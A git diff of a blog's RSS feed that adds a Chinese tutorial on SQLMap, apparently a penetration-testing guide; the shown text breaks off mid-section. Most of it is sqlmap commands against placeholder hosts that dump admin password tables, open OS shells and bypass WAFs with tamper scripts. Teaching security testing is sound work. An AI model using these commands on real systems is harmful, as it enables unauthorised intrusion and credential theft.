@@ -1,4 +1,239 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>教程 on 言零的博客</title><link>https://blog.caowo.de/tags/%E6%95%99%E7%A8%8B/</link><description>Recent content in 教程 on 言零的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 01 Mar 2026 15:00:00 +0800</lastBuildDate><atom:link href="https://blog.caowo.de/tags/%E6%95%99%E7%A8%8B/index.xml" rel="self" type="application/rss+xml"/><item><title>Nuclei 漏洞扫描器从入门到精通</title><link>https://blog.caowo.de/posts/nuclei-tutorial/</link><pubDate>Sun, 01 Mar 2026 15:00:00 +0800</pubDate><guid>https://blog.caowo.de/posts/nuclei-tutorial/</guid><description>&lt;h1 id="nuclei-漏洞扫描器从入门到精通"&gt;Nuclei 漏洞扫描器从入门到精通
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>教程 on 言零的博客</title><link>https://blog.caowo.de/tags/%E6%95%99%E7%A8%8B/</link><description>Recent content in 教程 on 言零的博客</description><generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Sun, 01 Mar 2026 17:00:00 +0800</lastBuildDate><atom:link href="https://blog.caowo.de/tags/%E6%95%99%E7%A8%8B/index.xml" rel="self" type="application/rss+xml"/><item><title>SQLMap 注入工具从入门到精通</title><link>https://blog.caowo.de/posts/sqlmap-tutorial/</link><pubDate>Sun, 01 Mar 2026 17:00:00 +0800</pubDate><guid>https://blog.caowo.de/posts/sqlmap-tutorial/</guid><description>&lt;h1 id="sqlmap-注入工具从入门到精通"&gt;SQLMap 注入工具从入门到精通
+&lt;/h1&gt;
+ &lt;blockquote&gt;
+ &lt;p&gt;&lt;strong&gt;工具名称：&lt;/strong&gt; SQLMap&lt;br&gt;
+&lt;strong&gt;GitHub:&lt;/strong&gt; &lt;a class="link" href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener"
+ &gt;https://github.com/sqlmapproject/sqlmap&lt;/a&gt;&lt;br&gt;
+&lt;strong&gt;适用场景：&lt;/strong&gt; SQL 注入检测、数据库渗透测试&lt;/p&gt;
+
+ &lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id="工具概述"&gt;工具概述
+&lt;/h2&gt;&lt;p&gt;SQLMap 是一款自动化的 SQL 注入工具，支持检测和使用多种 SQL 注入技术，是渗透测试人员的必备工具。&lt;/p&gt;
+&lt;h3 id="核心功能"&gt;核心功能
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;✅ &lt;strong&gt;自动检测&lt;/strong&gt; - 自动识别 SQL 注入点&lt;/li&gt;
+&lt;li&gt;✅ &lt;strong&gt;多种注入&lt;/strong&gt; - 支持 6 种注入类型&lt;/li&gt;
+&lt;li&gt;✅ &lt;strong&gt;数据库支持&lt;/strong&gt; - 支持 30+ 种数据库&lt;/li&gt;
+&lt;li&gt;✅ &lt;strong&gt;数据提取&lt;/strong&gt; - 可提取数据库、表、列数据&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id="环境搭建"&gt;环境搭建
+&lt;/h2&gt;&lt;h3 id="1-安装-sqlmap"&gt;1. 安装 SQLMap
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Git 克隆&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;git clone --depth &lt;span class="m"&gt;1&lt;/span&gt; https://github.com/sqlmapproject/sqlmap.git
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; sqlmap
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 运行&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 sqlmap.py --version
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 创建软链接&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ln -s &lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="k"&gt;)&lt;/span&gt;/sqlmap.py /usr/local/bin/sqlmap
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2-验证安装"&gt;2. 验证安装
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap --version
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="基础使用"&gt;基础使用
+&lt;/h2&gt;&lt;h3 id="1-检测注入点"&gt;1. 检测注入点
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 基础检测&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 详细输出&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; -v &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 指定 POST 数据&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/login&amp;#34;&lt;/span&gt; --data &lt;span class="s2"&gt;&amp;#34;username=admin&amp;amp;password=123&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2-获取数据库信息"&gt;2. 获取数据库信息
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取当前数据库&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --current-db
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取所有数据库&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --dbs
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取表&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; -D database --tables
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取列&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; -D database -T table --columns
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取数据&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; -D database -T table -C column --dump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="3-获取-shell"&gt;3. 获取 Shell
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取 Web Shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --os-shell
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取系统 Shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --os-pwn
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 执行系统命令&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --os-cmd &lt;span class="s2"&gt;&amp;#34;whoami&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="高级用法"&gt;高级用法
+&lt;/h2&gt;&lt;h3 id="1-注入技术选择"&gt;1. 注入技术选择
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 指定注入类型&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --technique&lt;span class="o"&gt;=&lt;/span&gt;BEUSTQ
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 只使用布尔盲注&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --technique&lt;span class="o"&gt;=&lt;/span&gt;B
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 只使用时间盲注&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --technique&lt;span class="o"&gt;=&lt;/span&gt;T
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2-绕过-waf"&gt;2. 绕过 WAF
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 使用 tamper 脚本&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --tamper&lt;span class="o"&gt;=&lt;/span&gt;space2comment
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 多个 tamper&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --tamper&lt;span class="o"&gt;=&lt;/span&gt;space2comment,randomcase
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 查看所有 tamper&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap --list-tamper
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="3-自定义请求"&gt;3. 自定义请求
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 从文件读取请求&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -r request.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 指定 Cookie&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --cookie&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;PHPSESSID=abc123&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 指定 User-Agent&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --user-agent&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;Mozilla/5.0&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="tamper-脚本"&gt;Tamper 脚本
+&lt;/h2&gt;&lt;h3 id="常用-tamper"&gt;常用 Tamper
+&lt;/h3&gt;&lt;table&gt;
+ &lt;thead&gt;
+ &lt;tr&gt;
+ &lt;th&gt;脚本名&lt;/th&gt;
+ &lt;th&gt;作用&lt;/th&gt;
+ &lt;th&gt;适用场景&lt;/th&gt;
+ &lt;/tr&gt;
+ &lt;/thead&gt;
+ &lt;tbody&gt;
+ &lt;tr&gt;
+ &lt;td&gt;space2comment&lt;/td&gt;
+ &lt;td&gt;空格转注释&lt;/td&gt;
+ &lt;td&gt;基础 WAF&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;randomcase&lt;/td&gt;
+ &lt;td&gt;随机大小写&lt;/td&gt;
+ &lt;td&gt;大小写敏感 WAF&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;charencode&lt;/td&gt;
+ &lt;td&gt;URL 编码&lt;/td&gt;
+ &lt;td&gt;基础过滤&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;apostrophemask&lt;/td&gt;
+ &lt;td&gt;引号替换&lt;/td&gt;
+ &lt;td&gt;引号过滤&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;tr&gt;
+ &lt;td&gt;between&lt;/td&gt;
+ &lt;td&gt;使用 BETWEEN&lt;/td&gt;
+ &lt;td&gt;比较运算符过滤&lt;/td&gt;
+ &lt;/tr&gt;
+ &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h3 id="使用示例"&gt;使用示例
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 单个 tamper&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --tamper&lt;span class="o"&gt;=&lt;/span&gt;space2comment
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 多个 tamper&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --tamper&lt;span class="o"&gt;=&lt;/span&gt;space2comment,randomcase,charencode
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="实战案例"&gt;实战案例
+&lt;/h2&gt;&lt;h3 id="案例-1get-注入"&gt;案例 1：GET 注入
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 检测&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/news.php?id=1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取数据库&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/news.php?id=1&amp;#34;&lt;/span&gt; --dbs
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取管理员密码&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/news.php?id=1&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -D website -T admin -C username,password --dump
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="案例-2post-注入"&gt;案例 2：POST 注入
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 检测 POST 注入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/login.php&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --data &lt;span class="s2"&gt;&amp;#34;username=admin&amp;amp;password=123&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取数据&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/login.php&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --data &lt;span class="s2"&gt;&amp;#34;username=admin&amp;amp;password=123&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; -D database --tables
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="案例-3cookie-注入"&gt;案例 3：Cookie 注入
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 检测 Cookie 注入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/admin.php&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --cookie &lt;span class="s2"&gt;&amp;#34;PHPSESSID=abc123; admin=1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 获取 Shell&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/admin.php&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --cookie &lt;span class="s2"&gt;&amp;#34;PHPSESSID=abc123&amp;#34;&lt;/span&gt; --os-shell
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="案例-4http-头注入"&gt;案例 4：HTTP 头注入
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# User-Agent 注入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --headers &lt;span class="s2"&gt;&amp;#34;User-Agent: Mozilla/5.0&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Referer 注入&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/&amp;#34;&lt;/span&gt; &lt;span class="se"&gt;\
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; --headers &lt;span class="s2"&gt;&amp;#34;Referer: http://evil.com&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="性能优化"&gt;性能优化
+&lt;/h2&gt;&lt;h3 id="1-提升速度"&gt;1. 提升速度
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 增加并发&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --threads&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 降低级别&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --level&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 减少风险&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --risk&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="2-减少误报"&gt;2. 减少误报
+&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 提高级别&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --level&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 提高风险&lt;/span&gt;
